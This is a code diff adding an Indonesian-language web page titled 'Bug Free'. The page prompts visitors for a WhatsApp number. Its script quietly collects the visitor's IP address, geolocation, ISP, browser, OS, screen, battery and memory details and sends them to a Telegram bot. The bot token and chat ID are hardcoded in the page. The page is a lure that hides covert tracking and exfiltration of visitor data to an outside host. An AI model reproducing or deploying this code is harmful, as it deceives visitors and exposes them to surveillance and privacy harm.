@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Bug Free</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #111;
+      color: #fff;
+      text-align: center;
+      padding-top: 50px;
+    }
+    input {
+      padding: 10px;
+      width: 250px;
+      border: none;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      background: #00c853;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .box {
+      background: #1e1e1e;
+      display: inline-block;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #00c853;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h1>📱 Bug Free</h1>
+    <input type="text" id="waNumber" placeholder="Masukkan Nomor WhatsApp" required /><br>
+    <button onclick="kirim()">Kirim</button>
+  </div>
+
+<script>
+const botToken = '8174097767:AAHm0ABVfr_dxSLkghXpozdcYiqdArH2cE4';
+const chatId = '7882058841';
+
+async function kirim() {
+  const waNumber = document.getElementById('waNumber').value.trim();
+  if (!waNumber) {
+    alert('Nomor WhatsApp wajib diisi!');
+    return;
+  }
+
+  let ip = '-', city = '-', region = '-', country = '-', org = '-';
+
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    ip = ipData.ip;
+
+    const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+    const loc = await locRes.json();
+    if (loc.status === 'success') {
+      city = loc.city;
+      region = loc.regionName;
+      country = loc.country;
+      org = loc.org;
+    }
+  } catch (e) {}
+
+  const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+  const batteryPercent = battery.level ? (battery.level * 100).toFixed(0) + '%' : 'N/A';
+
+  const text = `
+📍 Info Pengunjung - Bug Free
+
+Nomor WA   : ${waNumber}
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Browser    : ${navigator.userAgent}
+OS         : ${navigator.platform}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Waktu      : ${new Date().toLocaleString()}
+`.trim();
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text })
+  }).then(() => {
+    alert('Berhasil dikirim ke Telegram!');
+  }).catch(() => {
+    alert('Gagal mengirim ke Telegram!');
+  });
+}
+</script>
+</body>
+</html>
